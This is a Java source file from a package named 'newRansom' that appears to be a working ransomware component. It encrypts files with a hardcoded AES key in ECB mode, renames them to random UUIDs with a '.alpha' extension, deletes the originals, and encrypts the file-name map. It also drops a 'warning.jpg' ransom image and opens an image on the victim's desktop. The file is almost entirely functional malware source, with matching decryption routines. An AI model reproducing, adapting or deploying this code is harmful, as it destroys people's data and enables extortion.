package newRansom;

import java.awt.Desktop;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;

public class Cip implements CipInterface {

	private static Key publicKey;
	private static Key privateKey;
	private static Key key;
	
	static String aesfilepath = System.getProperty("user.home")+File.separator+"Desktop"+File.separator;
	Random r = new Random();
	Integer i = r.nextInt();
	Map<String, String> list = new HashMap<String, String>();
	
//    private static final String KEY = "ZZHHYYTTUUHHGGRR";
//    private static final String IV = "AAACCCDDDYYUURRS";
    

	public void CreateKey() { // 공개키 및 개인키 생성
		try {
			String KEY = "123456789abcdefg";
			SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "AES");
			
			this.key = secretKeySpec; 
			URL url=getClass().getClassLoader().getResource("img/美希.png");
//			File r = new File("美希.png");
			File r =Paths.get(url.toURI()).toFile();
		    Desktop dt = Desktop.getDesktop();
		    dt.open(r);
			
			

		} catch (Exception e) {
			e.printStackTrace();
		}
		
		
	}
	
	
//	public static void AESEncryption(byte[] target,  String filename) throws Exception{   
//	  
//	     
//	     Cipher cipher = Cipher.getInstance("AES");     
//	     SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(),"AES");
//	     cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);      
//	     byte[] encryptBytes = cipher.doFinal(target);
//	    
//	     CreateFile(aesfilepath,filename,encryptBytes);
//	  
//	     
//	     
//		}
	
	public static void CreateFile(String filepath, String filename, byte[] str) {
		new File(filepath + filename);
		OutputStream bw;
		try {
			bw =new FileOutputStream(filepath + filename);
			bw.write(str);
			bw.close();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void CreateListFile(String filepath) {
		// TODO Auto-generated method stub
		Cipher cipher;
		try {
			cipher = Cipher.getInstance("AES");
//			SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(),"AES");
			cipher.init(Cipher.ENCRYPT_MODE, key);

			BufferedWriter bw;

			bw = new BufferedWriter(new FileWriter(new File(filepath + "list")));

			for (String key : list.keySet()) {

				bw.write(key);
				bw.newLine(); 
				bw.write(list.get(key));
				bw.newLine();
			}
			bw.close(); 

		} 

		catch (NoSuchAlgorithmException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (NoSuchPaddingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public boolean CreateReadFile(String filepath, String filename) {
//		BufferedWriter bw;
		File f= new File(filepath + filename);
//		URL url=getClass().getClassLoader().getResource("warning.jpg");
		URL url=getClass().getClassLoader().getResource("img/warning.jpg");
		File warning = new File(filepath+File.separator+"warning.jpg");
		File r=null;
		if(warning.isFile()) {
			return false;
			
		}
		try {
//			bw = new BufferedWriter(new FileWriter(f));
//			URL url=getClass().getClassLoader().getResource("/img/美希.png");
//			File r = new File("美希.png");
			try {
				r =Paths.get(url.toURI()).toFile();
			} catch (URISyntaxException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		  	FileWriter fis = new FileWriter(warning);
		  	File origin_name = new File("warning.jpg");
		  	BufferedImage buffer_original_image = ImageIO.read(r);
		  	ImageIO.write(buffer_original_image, "jpg",warning);
//			bw.write("당신의 파일은 랜섬웨어에 의해 암호화 되었습니다.");
//			bw.newLine();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return true;
	}

	public void FileEncrypt(String filepath, String filename) {
		// TODO Auto-generated method stub
		try {

//			byte[] bytesOfKey = key.getBytes("UTF-8");				
//			MessageDigest md = MessageDigest.getInstance("MD5");
//			byte[] keyBytes = md.digest(bytesOfKey);
		
		
//			final byte[] ivBytes = IV.getBytes();
		
//			SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE, key);
		
			String inFile = filepath + filename;
			String outFilename = CreateFileName(filepath, filename) + ".alpha";
		
			File f = new File(inFile);
		
			if(!f.isFile()) return;
			
			FileOutputStream out = new FileOutputStream(filepath + outFilename);

			byte[] buffer = new byte[1024];
            int read = -1;
            
            InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);
            try {
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            
            if (f.delete())
				System.out.println("삭제완료1");
			else
				System.out.println("삭제실패1");
		} 
		catch (Exception e) {
//			e.printStackTrace();
		}
	
		
}

	private String CreateFileName(String filepath, String filename) {
		// TODO Auto-generated method stub
		
		String uniqueFileName = getUniqueFileName();
		boolean flag = doCheckFileExists(filepath + uniqueFileName + ".alpha");
		while (flag) {
			uniqueFileName = getUniqueFileName();
			flag = doCheckFileExists(filepath + uniqueFileName + ".alpha");
		}
		list.put(uniqueFileName, filename);
		return uniqueFileName;
		
	}

	private boolean doCheckFileExists(String fullPath) {
		// TODO Auto-generated method stub
		return new File(fullPath).exists();
	}

	private String getUniqueFileName() {
		// TODO Auto-generated method stub
		return UUID.randomUUID().toString();
	}

	public void FileDecryte(String filepath, String filename) {
		// TODO Auto-generated method stub
//		byte[] bytesOfKey = null;
//		MessageDigest md = null;
//		
//		try {
//			bytesOfKey = key.getBytes("UTF-8");
//			md = MessageDigest.getInstance("MD5");
//		} catch (NoSuchAlgorithmException e1) {
//			// TODO Auto-generated catch block
//			e1.printStackTrace();
//		} catch (UnsupportedEncodingException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//        byte[] keyBytes = md.digest(bytesOfKey);
//        
//        final byte[] kBytes = key.getBytes();
//
//        final byte[] encryptedBytes;
//        
//        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
//        
//        final byte[] ivBytes = IV.getBytes();
		
		Cipher cipher;
		try {
			cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, key);

			String inFile = filepath + filename;
			String outFilename = filename;
//			System.out.print(b);
			File f = new File(inFile);
			
	//		if(!f.isFile()) return;
//			System.out.println(outFilename.substring(0, (outFilename.length() - 6)));
//			if(list.get(outFilename.substring(0, (outFilename.length() - 6)))==null)
//				return;
			outFilename = list.get(outFilename.substring(0, (outFilename.length() - 6))); //
//			System.out.println(inFile+"////////"+outFilename);
			int pos = outFilename.lastIndexOf("."); 
			String ext = outFilename.substring(pos + 1);

			
			byte[] buffer = new byte[1024];
			int read = -1;
			
//			FileOutputStream out = new FileOutputStream(filepath + outFilename);
//            InputStream input = new BufferedInputStream(new FileInputStream(f));
//            OutputStream output = new BufferedOutputStream(out);
			File of = new File(filepath+outFilename);
			InputStream input = new BufferedInputStream(new FileInputStream(f));
			OutputStream output = new BufferedOutputStream(new FileOutputStream(of));
            try {
                	while ((read = input.read(buffer)) != -1) {
                		output.write(cipher.update(buffer, 0, read));
                	}
                	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            
            input.close();
			output.close();

			f.delete();
//			if( (outFilename.substring(0, (outFilename.length() - 5)).contentEquals("alpha")) )
//				;
			return;
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
//			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
//			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
//			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
//			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
//			e.printStackTrace();
		}
		
	}

	public Map<String, String> ReturnList() {
		// TODO Auto-generated method stub
		return list;
	}

	public void ReadListFile(String filepath) {
		// TODO Auto-generated method stub
		try {

			BufferedReader bw;

			bw = new BufferedReader(new FileReader(new File(filepath + "list")));
			Map<String,String> newlist = new HashMap<String,String>();
			String key = null;
			String value=null;

			while((key = bw.readLine())!=null) {
				value = (bw.readLine());
//				System.out.println("스트"+key);
//				System.out.println(value);		
				newlist.put(key,value);
			}
			list = newlist;
			for (String ke : newlist.keySet()) {
//				System.out.println(ke+"    "+newlist.get(ke));
			}
			bw.close(); 
//			System.out.print("이게 리스틤"+list);
		}
		catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void ListEncrypt(String filepath, String filename) {
		// TODO Auto-generated method stub
		
		try {

//			byte[] bytesOfKey = key.getBytes("UTF-8");				
//			MessageDigest md = MessageDigest.getInstance("MD5");
//			byte[] keyBytes = md.digest(bytesOfKey);
//		
//	        
//			final byte[] ivBytes = IV.getBytes();
//
//	        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
	        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
	        cipher.init(Cipher.ENCRYPT_MODE, key);

			String inFile = filepath + filename;
			String outFilename = filename + ".alpha";

			
			File f = new File(inFile);
			
			FileInputStream in = new FileInputStream(inFile);
			FileOutputStream out = new FileOutputStream(filepath + outFilename);
			
			
			byte[] buffer = new byte[1024];
            int read = -1;
            
            InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);
            
            try {
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            
			out.close();
			in.close();
					
			if (f.delete())
				System.out.println("삭제완료2");
			else
				System.out.println("삭제실패");
					

		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	public void ListDecryte(String filepath, String filename) {
		// TODO Auto-generated method stub
		
		Cipher cipher;
		try {
//			byte[] bytesOfKey = key.getBytes("UTF-8");				
//			MessageDigest md = MessageDigest.getInstance("MD5");
//			byte[] keyBytes = md.digest(bytesOfKey);
//	        
//	        final byte[] kBytes = key.getBytes();
//
//	        final byte[] encryptedBytes;
//	        
//	        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
//	        
//	        final byte[] ivBytes = IV.getBytes();
	        
	        cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, key);
	        
			String inFile = filepath + filename;
			String outFilename = filename;

			outFilename = outFilename.substring(0, outFilename.length() - 6);

			String outFile = filepath + outFilename;

			
			byte[] buffer = new byte[1024];
			int read = -1;
			
			
			File f = new File(inFile);
			
			
			FileInputStream in = new FileInputStream(inFile);
			FileOutputStream out = new FileOutputStream(filepath + outFilename);
			
			InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);

            try {
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }

            input.close();
			out.close();

			f.delete(); 


			return;
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
